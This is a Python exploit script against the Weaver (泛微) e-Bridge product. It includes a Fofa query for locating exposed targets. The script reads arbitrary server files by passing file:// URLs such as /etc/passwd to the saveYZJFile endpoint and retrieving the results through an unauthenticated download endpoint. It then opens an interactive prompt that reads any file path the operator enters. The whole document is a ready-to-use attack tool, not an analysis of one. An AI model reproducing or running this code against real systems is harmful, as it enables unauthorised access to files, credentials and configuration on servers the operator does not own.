# -*- coding: utf-8 -*-
# 泛微云桥任意文件读取
# Fofa: title="泛微云桥e-Bridge"

import requests
import re
import sys
import time

BLUE = '\033[0;36m'
RED = '\x1b[1;91m'
YELLOW = '\033[33m'
VIOLET = '\033[1;94m'
GREEN = '\033[1;32m'
BOLD = '\033[1m'
ENDC = '\033[0m'


def now_time():
    return BLUE + time.strftime("[%H:%M:%S] ", time.localtime()) + ENDC


def info():
    return VIOLET + "[INFO] " + ENDC


def error():
    return RED + "[ERROR] " + ENDC


def success():
    return GREEN + "[SUCCESS] " + ENDC


def warning():
    return YELLOW + "[WARNING] " + ENDC


# 判断操作系统 or 判断漏洞是否可利用
def check(target_url):
    vuln_url_1 = target_url + "wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///C:/&fileExt=txt"
    vuln_url_2 = target_url + "wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///etc/passwd&fileExt=txt"
    vuln_url_3 = target_url + "wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///&fileExt=txt"

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    try:
        requests.packages.urllib3.disable_warnings()
        response_1 = requests.get(url=vuln_url_1, headers=headers, verify=False, timeout=5)
        response_2 = requests.get(url=vuln_url_2, headers=headers, verify=False, timeout=5)
        response_3 = requests.get(url=vuln_url_3, headers=headers, verify=False, timeout=5)
        if "无法验证您的身份" in response_1.text and "无法验证您的身份" in response_2.text:
            print(now_time() + info() + "漏洞已修复, 不存在漏洞 ")
            return None, None
        else:
            if "No such file or directory" in response_1.text:
                print(now_time() + info() + "目标为 Linux 系统")
                id = re.findall(r'"id":"(.*?)"', response_3.text)[0]
                print(now_time() + info() + "成功获取id: {}".format(id))
                return id, "linux"
            elif "系统找不到指定的路径" in response_2.text:
                print(now_time() + info() + "目标为 Windows 系统")
                id = re.findall(r'"id":"(.*?)"', response_1.text)[0]
                print(now_time() + info() + "成功获取id: {}".format(id))
                return id, "windows"

            else:
                print(now_time() + error() + "无法获取目标系统")
                return None, None

    except Exception as e:
        print(now_time() + error() + "请求失败:{} ".format(e))
        return None, None


# 验证漏洞
def POC_2(target_url, id):
    file_url = target_url + "file/fileNoLogin/{}".format(id)
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    try:
        requests.packages.urllib3.disable_warnings()
        response = requests.get(url=file_url, headers=headers, verify=False, timeout=10)
        response.encoding = 'GBK'
        print(now_time() + ENDC + success() + "成功读取: \n\n{}".format(
            response.text))
    except Exception as e:
        print(now_time() + error() + "请求失败:{} ".format(e))
        pass


# windows 文件读取
def POC_3(target_url, File):
    file_url = target_url + "wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///C:/{}&fileExt=txt".format(File)
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    try:
        requests.packages.urllib3.disable_warnings()
        response = requests.get(url=file_url, headers=headers, verify=False, timeout=10)
        id = re.findall(r'"id":"(.*?)"', response.text)[0]
        print(now_time() + info() + "成功获取id: {}".format(id))

        POC_2(target_url, id)
    except:
        print(now_time() + error() + "请求失败, 无法读取文件")


# linux读取文件
def POC_4(target_url, File):
    file_url = target_url + "wxjsapi/saveYZJFile?fileName=test&downloadUrl=file://{}&fileExt=txt".format(File)
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    try:
        requests.packages.urllib3.disable_warnings()
        response = requests.get(url=file_url, headers=headers, verify=False, timeout=10)
        id = re.findall(r'"id":"(.*?)"', response.text)[0]
        print(now_time() + info() + "成功获取id: {}".format(id))
        POC_2(target_url, id)
    except:
        print(now_time() + error() + "请求失败, 无法读取文件")


if __name__ == '__main__':
    target_url = sys.argv[1]
    if target_url[-1] != '/':
        target_url += '/'
    print(now_time() + info() + 'Target: ' + target_url)
    id, system = check(target_url)
    if id is None:
        sys.exit()
    POC_2(target_url, id)
    while True:
        if system == "windows":
            File = input(now_time() + VIOLET + "[INPUT] " + ENDC + "Path or File: ")
            if File == "exit":
                sys.exit(0)
            else:
                POC_3(target_url, File)
        if system == "linux":
            File = input(now_time() + VIOLET + "[INPUT] " + ENDC + "Path or File: ")
            if File == "exit":
                sys.exit(0)
            else:
                POC_4(target_url, File)
